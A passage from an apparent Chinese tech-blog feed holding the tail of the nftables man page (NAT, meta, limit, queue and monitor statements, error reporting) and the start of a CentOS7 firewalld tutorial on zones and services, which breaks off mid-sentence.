class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>示例 22. restrict events reported by ctnetlink</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ct eventmask set new or related or destroy</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="meta-statement">Meta statement<a class="hash-link" href="#meta-statement" title="标题的直接链接">​</a></h3><p>A meta statement sets the value of a meta expression. The existing meta fields are: priority, mark, pkttype, nftrace.</p><p><code>meta {mark | priority | pkttype | nftrace} [set] value</code></p><p>A meta statement sets meta data associated with a packet.</p><p><strong><em>Table 51. Meta statement types</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Value</th></tr></thead><tbody><tr><td>priority</td><td>TC packet priority</td><td>tc_handle</td></tr><tr><td>mark</td><td>Packet mark</td><td>mark</td></tr><tr><td>pkttype</td><td>packet type</td><td>pkt_type</td></tr><tr><td>nftrace</td><td>ruleset packet tracing on/off. Use <strong><em>monitor trace</em></strong> command to watch traces</td><td>0, 1</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="limit-statement">Limit statement<a class="hash-link" href="#limit-statement" title="标题的直接链接">​</a></h3><p><code>limit [rate] [over]_packet_number_ [/] {second | minute | hour | day} [burst _packet_number_ packets]</code></p><p><code>limit [rate] [over]_byte_number_ {bytes | kbytes | mbytes} [/] {second | minute | hour | day | week} [burst _byte_number_ bytes]</code></p><p>A limit statement matches at a limited rate using a token bucket filter. A rule using this statement will match until this limit is reached. It can be used in combination with the log statement to give limited logging. The <strong><em>over</em></strong> keyword, that is optional, makes it match over the specified rate.</p><p><strong><em>Table 52. limit statement values</em></strong></p><table><thead><tr><th>Value</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>packet_number</td><td>Number of packets</td><td>unsigned integer (32 bit)</td></tr><tr><td>byte_number</td><td>Number of bytes</td><td>unsigned integer (32 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="nat-statements">NAT statements<a class="hash-link" href="#nat-statements" title="标题的直接链接">​</a></h3><p><code>snat [to _address_ [:port]] [persistent, random, fully-random]</code></p><p><code>snat [to _address_ - _address_ [:_port_ - _port_]] [persistent, random, fully-random]</code></p><p><code>dnat [to _address_ [:_port_]] [persistent, random, fully-random]</code></p><p><code>dnat [to _address_ [:_port_ - _port_]] [persistent, random, fully-random]</code></p><p><code>masquerade [to [:_port_]] [persistent, random, fully-random]</code></p><p><code>masquerade [to [:_port_ - _port_]] [persistent, random, fully-random]</code></p><p><code>redirect [to [:_port_]] [persistent, random, fully-random]</code></p><p><code>redirect [to [:_port_ - _port_]] [persistent, random, fully-random]</code></p><p>The nat statements are only valid from nat chain types.</p><p>The <strong><em>snat</em></strong> and <strong><em>masquerade</em></strong> statements specify that the source address of the packet should be modified. While <strong><em>snat</em></strong> is only valid in the postrouting and input chains, <strong><em>masquerade</em></strong> makes sense only in postrouting. The <strong><em>dnat</em></strong> and <strong><em>redirect</em></strong> statements are only valid in the prerouting and output chains, they specify that the destination address of the packet should be modified. You can use non-base chains which are called from base chains of nat chain type too. All future packets in this connection will also be mangled, and rules should cease being examined.</p><p>The <strong><em>masquerade</em></strong> statement is a special form of <strong><em>snat</em></strong> which always uses the outgoing interface's IP address to translate to. It is particularly useful on gateways with dynamic (public) IP addresses.</p><p>The <strong><em>redirect</em></strong> statement is a special form of <strong><em>dnat</em></strong> which always translates the destination address to the local host's one. It comes in handy if one only wants to alter the destination port of incoming traffic on different interfaces.</p><p>Note that all nat statements require both prerouting and postrouting base chains to be present since otherwise packets on the return path won't be seen by netfilter and therefore no reverse translation will take place.</p><p><strong><em>Table 53. NAT statement values</em></strong></p><table><thead><tr><th>Expression</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>address</td><td>Specifies that the source/destination address of the packet should be modified. You may specify a mapping to relate a list of tuples composed of arbitrary expression key with address value.</td><td>ipv4_addr, ipv6_addr, eg. abcd::1234, or you can use a mapping, eg. meta mark map { 10 : 192.168.1.2, 20 : 192.168.1.3 }</td></tr><tr><td>port</td><td>Specifies that the source/destination address of the packet should be modified.</td><td>port number (16 bits)</td></tr></tbody></table><p><strong><em>Table 54. NAT statement flags</em></strong></p><table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td>persistent</td><td>Gives a client the same source-/destination-address for each connection.</td></tr><tr><td>random</td><td>If used then port mapping will be randomized using a random seeded MD5 hash mix using source and destination address and destination port.</td></tr><tr><td>fully-random</td><td>If used then port mapping is generated based on a 32-bit pseudo-random algorithm.</td></tr></tbody></table><p><strong><em>示例 23. Using NAT statements</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># create a suitable table/chain setup for all further examples</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add table nat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add chain nat prerouting { type nat hook prerouting priority 0; }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add chain nat postrouting { type nat hook postrouting priority 100; }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># translate source addresses of all packets leaving via eth0 to address 1.2.3.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add rule nat postrouting oif eth0 snat to 1.2.3.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># redirect all traffic entering via eth0 to destination address 192.168.1.120</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add rule nat prerouting iif eth0 dnat to 192.168.1.120</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># translate source addresses of all packets leaving via eth0 to whatever</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># locally generated packets would use as source to reach the same destination</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add rule nat postrouting oif eth0 masquerade</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># redirect incoming TCP traffic for port 22 to port 2222</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add rule nat prerouting tcp dport 22 redirect to :2222</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="queue-statement">Queue statement<a class="hash-link" href="#queue-statement" title="标题的直接链接">​</a></h3><p>This statement passes the packet to userspace using the nfnetlink_queue handler. The packet is put into the queue identified by its 16-bit queue number. Userspace can inspect and modify the packet if desired. Userspace must then drop or reinject the packet into the kernel. See libnetfilter_queue documentation for details.</p><p><code>queue [num _queue_number_] [bypass]</code></p><p><code>queue [num _queue_number_from_ - _queue_number_to_] [bypass,fanout]</code></p><p><strong><em>Table 55. queue statement values</em></strong></p><table><thead><tr><th>Value</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>queue_number</td><td>Sets queue number, default is 0.</td><td>unsigned integer (16 bit)</td></tr><tr><td>queue_number_from</td><td>Sets initial queue in the range, if fanout is used.</td><td>unsigned integer (16 bit)</td></tr><tr><td>queue_number_to</td><td>Sets closing queue in the range, if fanout is used.</td><td>unsigned integer (16 bit)</td></tr></tbody></table><p><strong><em>Table 56. queue statement flags</em></strong></p><table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td>bypass</td><td>Let packets go through if userspace application cannot back off. Before using this flag, read libnetfilter_queue documentation for performance tuning recomendations.</td></tr><tr><td>fanout</td><td>Distribute packets between several queues.</td></tr></tbody></table><h2 class="anchor anchorWithStickyNavbar_LWe7" id="additional-commands">Additional commands<a class="hash-link" href="#additional-commands" title="标题的直接链接">​</a></h2><p>These are some additional commands included in nft.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="export">export<a class="hash-link" href="#export" title="标题的直接链接">​</a></h3><p>Export your current ruleset in XML or JSON format to stdout.</p><p>Examples:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">% nft export json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="monitor">monitor<a class="hash-link" href="#monitor" title="标题的直接链接">​</a></h3><p>The monitor command allows you to listen to Netlink events produced by the nf_tables subsystem, related to creation and deletion of objects. When they ocurr, nft will print to stdout the monitored events in either XML, JSON or native nft format.</p><p>To filter events related to a concrete object, use one of the keywords 'tables', 'chains', 'sets', 'rules', 'elements'.</p><p>To filter events related to a concrete action, use keyword 'new' or 'destroy'.</p><p>Hit ^C to finish the monitor operation.</p><p><strong><em>示例 24. Listen to all events, report in native nft format</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">% nft monitor</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>示例 25. Listen to added tables, report in XML format</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">% nft monitor new tables xml</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>示例 26. Listen to deleted rules, report in JSON format</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">% nft monitor destroy rules json</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>示例 27. Listen to both new and destroyed chains, in native nft format</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">% nft monitor chains</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="error-reporting">Error reporting<a class="hash-link" href="#error-reporting" title="标题的直接链接">​</a></h2><p>When an error is detected, nft shows the line(s) containing the error, the position of the erroneous parts in the input stream and marks up the erroneous parts using carrets (^). If the error results from the combination of two expressions or statements, the part imposing the constraints which are violated is marked using tildes (~).</p><p>For errors returned by the kernel, nft can't detect which parts of the input caused the error and the entire command is marked.</p><p><strong><em>示例 28. Error caused by single incorrect expression</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;cmdline&gt;:1:19-22: Error: Interface does not exist</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output oif eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  ^^^^</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>示例 29. Error caused by invalid combination of two expressions</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;cmdline&gt;:1:28-36: Error: Right hand side of relational expression (==) must be constant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output tcp dport == tcp dport</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        ~~ ^^^^^^^^^</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>示例 30. Error returned by the kernel</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;cmdline&gt;:0:0-23: Error: Could not process rule: Operation not permitted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output oif wlan0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">^^^^^^^^^^^^^^^^^^^^^^^</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="退出状态码">退出状态码<a class="hash-link" href="#退出状态码" title="标题的直接链接">​</a></h2><p>On success, nft exits with a status of 0. Unspecified errors cause it to exit with a status of 1, memory allocation errors with a status of 2, unable to open Netlink socket with 3.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="see-also">See Also<a class="hash-link" href="#see-also" title="标题的直接链接">​</a></h2><p>iptables(8), ip6tables(8), arptables(8), ebtables(8), ip(8), tc(8)</p><p>There is an official wiki at: <a href="http://wiki.nftables.org" target="_blank" rel="noopener noreferrer">wiki.nftables.org</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="authors">Authors<a class="hash-link" href="#authors" title="标题的直接链接">​</a></h2><p>nftables was written by Patrick McHardy and Pablo Neira Ayuso, among many other contributors from the Netfilter community.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="copyright">Copyright<a class="hash-link" href="#copyright" title="标题的直接链接">​</a></h2><ul><li>Copyright&nbsp;©&nbsp;2008-2014&nbsp;Patrick&nbsp;McHardy&nbsp;<a href="mailto:%5Bkaber@trash.net%5D(mailto:kaber@trash.net)" target="_blank" rel="noopener noreferrer">[kaber@trash.net](mailto:kaber@trash.net)</a></li><li>Copyright&nbsp;©&nbsp;2013-2016&nbsp;Pablo&nbsp;Neira&nbsp;Ayuso&nbsp;<a href="mailto:%5Bpablo@netfilter.org%5D(mailto:pablo@netfilter.org)" target="_blank" rel="noopener noreferrer">[pablo@netfilter.org](mailto:pablo@netfilter.org)</a></li></ul><p>nftables is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License version 2 as published by the Free Software Foundation.</p><p><strong><em>This documentation is licenced under the terms of the Creative Commons Attribution-ShareAlike 4.0 license, <a href="http://creativecommons.org/licenses/by-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-SA 4.0</a>.</em></strong></p>]]></content>
        <category label="nft" term="nft"/>
        <category label="nftables" term="nftables"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[开篇]]></title>
        <id>/2017/05/31/first-post</id>
        <link href="https://itxx00.github.io/notes/blog/2017/05/31/first-post"/>
        <updated>2017-05-31T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[重新写博客]]></summary>
        <content type="html"><![CDATA[<p>重新开始写博客，这篇作为开篇，继忙碌地工作了快两年之后，发现抽时间将一些想法和经验沉淀下来也是如此重要。而整理文章的过程本身也是对思绪的整理，可以帮助我们更好的理解所做的事情。
接下来会把旧博客的备份文章重新放上来。</p>]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CENTOS7管理之动态防火墙FIREWALLD]]></title>
        <id>/2015/01/03/centos7-firewalld-basic</id>
        <link href="https://itxx00.github.io/notes/blog/2015/01/03/centos7-firewalld-basic"/>
        <updated>2015-01-03T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>firewalld 的出现带来了许多新的亮点，它使得防火墙规则管理更加方便和统一，但 firewalld 项目本身还有诸多不完善的地方，还需要一些时间的沉淀才能变得更加稳定和得到更多软件社区的支持。在我们使用过程中也发现了其存在的一些问题，我们也正在努力参与到 firewalld 的改进和测试当中，也希望有更多的人能够参与进来。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="firewalld的出现">firewalld的出现<a class="hash-link" href="#firewalld的出现" title="标题的直接链接">​</a></h2><p>自 fedora18 开始，firewalld 已经成为默认的防火墙管理组件被集成到系统中，用以取代 iptables service 服务，而基于 fedora18 开发的RHEL7，以及其一脉相承的CentOS7 也都使用 firewalld 作为默认的防火墙管理组件，无论是对于日常使用还是企业应用来讲这样的变更都或多或少的为使用者带来了影响。在浏览完本文前我们先不急着下结论到底这样的变化是好是坏，让我们“剥离它天生的骄傲，排除这些外界的干扰“，来看看 firewalld 到底是什么样的。
以下内容以 CentOS7 系统为例进行讲解，我们假设读者对于 iptables 防火墙相关知识有一定的掌握。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="什么是动态防火墙">什么是动态防火墙？<a class="hash-link" href="#什么是动态防火墙" title="标题的直接链接">​</a></h2><p>我们首先需要弄明白的第一个问题是到底什么是动态防火墙。为了解答这个问题，我们先来回忆一下 iptables service 管理防火墙规则的模式：用户将新的防火墙规则添加进 /etc/sysconfig/iptables 配置文件当中，再执行命令 service iptables reload 使变更的规则生效。在这整个过程的背后，iptables service 首先对旧的防火墙规则进行了清空，然后重新完整地加载所有新的防火墙规则，而如果配置了需要 reload 内核模块的话，过程背后还会包含卸载和重新加载内核模块的动作，而不幸的是，这个动作很可能对运行中的系统产生额外的不良影响，特别是在网络非常繁忙的系统中。</p><p>如果我们把这种哪怕只修改一条规则也要进行所有规则的重新载入的模式称为静态防火墙的话，那么 firewalld 所提供的模式就可以叫做动态防火墙，它的出现就是为了解决这一问题，任何规则的变更都不需要对整个防火墙规则列表进行重新加载，只需要将变更部分保存并更新到运行中的 iptables 即可。</p><p>这里有必要说明一下 firewalld 和 iptables 之间的关系， firewalld 提供了一个 daemon 和 service，还有命令行和图形界面配置工具，它仅仅是替代了 iptables service 部分，其底层还是使用 iptables 作为防火墙规则管理入口。firewalld 使用 python 语言开发，在新版本中已经计划使用 c++ 重写 daemon 部分。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="firewalld-具有哪些特性">firewalld 具有哪些特性？<a class="hash-link" href="#firewalld-具有哪些特性" title="标题的直接链接">​</a></h2><p>那么 firewalld 除了是动态防火墙以外，它还具有哪些优势或者特性呢？第一个是配置文件。firewalld 的配置文件被放置在不同的 xml 文件当中，这使得对规则的维护变得更加容易和可读，有条理。相比于 iptables 的规则配置文件而言，这显然可以算作是一个进步。第二个是区域模型。firewalld 通过对 iptables 自定义链的使用，抽象出一个区域模型的概念，将原本十分灵活的自定义链统一成一套默认的标准使用规范和流程，使得防火墙在易用性和通用性上得到提升。令一个重要特性是对 ebtables 的支持，通过统一的接口来实现 ipt/ebt 的统一管理。还有一个重要特性是富语言。富语言风格的配置让规则管理变得更加人性化，学习门槛相比原生的 iptables 命令有所降低，让初学者可以在很短时间内掌握其基本用法，规则管理变得更快捷。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="firewalld-基本术语">firewalld 基本术语<a class="hash-link" href="#firewalld-基本术语" title="标题的直接链接">​</a></h2><p>本文不打算重复阐述现有文档中的基本知识，仅仅提供一些对现有文档中知识的补充和理解，详细的文档请参阅man page或本文结尾处的延伸阅读<sup id="fnref-1-c7e489"><a href="#fn-1-c7e489" class="footnote-ref">1</a></sup>部分。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="zone">zone：<a class="hash-link" href="#zone" title="标题的直接链接">​</a></h3><p>firewalld将网卡对应到不同的区域（zone），zone 默认共有9个，block  dmz  drop  external  home  internal  public  trusted  work ，不同的区域之间的差异是其对待数据包的默认行为不同，根据区域名字我们可以很直观的知道该区域的特征，在CentOS7系统中，默认区域被设置为public，而在最新版本的fedora（fedora21）当中随着 server 版和 workstation 版的分化则添加了两个不同的自定义 zone FedoraServer 和 FedoraWorkstation 分别对应两个版本。使用下面的命令分别列出所有支持的 zone 和查看当前的默认 zone：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">firewall-cmd --get-zones</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">firewall-cmd --get-default-zone</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>所有可用 zone 的 xml 配置文件被保存在 /usr/lib/firewalld/zones/ 目录，该目录中的配置为默认配置，不允许管理员手工修改，自定义 zone 配置需保存到 /etc/firewalld/zones/ 目录。防火墙规则即是通过 zone 配置文件进行组织管理，因此 zone 的配置文件功能类似于 /etc/sysconfig/iptables 文件，只不过根据不同的场景默认定义了不同的版本供选择使用，这就是 zone 的方便之处。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="service">service：<a class="hash-link" href="#service" title="标题的直接链接">​</a></h3><p>在 /usr/lib/firewalld/services/ 目录中，还保存了另外一类配置文件，每个文件对应一项具体的网络服务，如 ssh 服务等，与之对应的配置文件中记录了各项服务所使用的 tcp/udp 端口，在最新版本的 firewalld 中默认已经定义了 70+ 种服务供我们使用，当默认提供的服务不够用或者需要自定义某项服务的端口时，我们需要将 service 配置文件放置在 /etc/firewalld/services/ 目录中。service 